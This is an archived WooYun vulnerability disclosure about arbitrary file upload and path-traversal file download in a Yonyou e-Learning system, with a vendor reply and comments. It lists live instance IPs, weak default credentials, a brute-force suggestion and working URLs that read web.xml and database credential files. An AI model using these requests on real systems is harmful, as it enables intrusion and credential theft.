{"id": 4997, "wybug_id": "wooyun-2014-048190", "wybug_title": "某通用型在线学习管理系统存在任意文件上传及任意文件下载漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "wefgod", "wybug_date": "2014-01-07 17:50", "wybug_open_date": "2014-04-07 17:51", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传内容未检查", "任意文件下载", "文件下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向公众公开  简要描述： 继续向大牛们学习了 详细说明：  先说个问题。此厂商在乌云已经有账号，但是之前对此套系统的漏洞视而不见，不打算进行修复，继续将漏洞提交给他们处理，可能会危害到客户的利益，在这我建议给cert通报以促进他们进行整改。（如果要给原厂商处理，那去掉我这段话……）前大牛的漏洞： WooYun: 用友某系统存在通用型远程代码执行 是用友的e-Learning存在任意文件上传和任意文件下载。不过要一个普通账户登录才可利用，当然我们可以暴力破解……没有验证码   漏洞证明：  首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://58.214.233.113:8800/lmsv5/00041013/12345600041014/12345600041012/123456http://60.216.4.162:9091/lmsv5/107649/111111107648/111111107640/111111文件上传http://60.216.4.162:9091/lmsv5/uploadfile!LoginUploadFile.action?uploadFileType=jsp\n\n\n\n看源码：\n\n\n\n另外一个：http://58.214.233.113:8800/lmsv5/uploadfile!LoginUploadFile.action?uploadFileType=jsp\n\n任意文件下载官方配置中是这样写的：\n<action name=\"downloadfile!*\" class =\"cn.com.iactive.learn.res.upOrdownFile.FileDownloadAction\" method=\"{1}\">               <!--下载文件的目录，若不在这个目录下则拒绝下载以保障安全，这点在action类中实现  -->           <param name=\"inputPath\">/coursedir</param>           <result name=\"success\" type=\"stream\">              <param name=\"contentType\">application/octet-stream</param>              <param name=\"inputName\">inputStream</param>              <!--动态获取文件名-->              <param name=\"contentDisposition\">attachment;filename=\"${fileName}\"</param>              <param name=\"bufferSize\">4096</param>           </result>\n看得眼泪流。一看代码：\npublic InputStream getInputStream()    throws Exception  {    int size = this.url.length() - 1;    for (int i = 0; i < size; i++)      this.url = this.url.replace(\"\\\\\", \"/\");    return ServletActionContext.getServletContext().getResourceAsStream(this.url);  }\n直接的用url参数那啥那啥……完全就没有过滤嘛http://60.216.4.162:9091/lmsv5/downloadfile!FileDownload.action?url=/WEB-INF/web.xml&fileName=/1.xmlhttp://60.216.4.162:9091/lmsv5/downloadfile!FileDownload.action?url=/WEB-INF/classes/dataBase.properties&fileName=/dataBase.properties\n\n\n\n\n\n另外一个例子：http://58.214.233.113:8800/lmsv5/downloadfile!FileDownload.action?url=/WEB-INF/web.xml&fileName=/1.xmlhttp://58.214.233.113:8800/lmsv5/downloadfile!FileDownload.action?url=/WEB-INF/classes/dataBase.properties&fileName=/dataBase.properties   修复方案：  文件上传：只能限制了啊文件下载：也限制啊   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-01-12 11:35 厂商回复： CNVD确认并在多个实例上复现所述情况，由CNVD已经向软件生产厂商——用友新道科技有限公司通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-07 18:08 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  应该说大牛向你学习了才对。那些大牛发了那么多的文章都不会写标题。没一个比你精彩的。你这是赤条条啊    \n     2014-01-07 21:23 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  我操 一天好几个么？    \n     2014-01-08 14:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @hacker@sina.cn 我的标题……反正不知道要怎么写了，就那么写了    \n     2014-01-08 14:54 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 一个星期一个就是    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}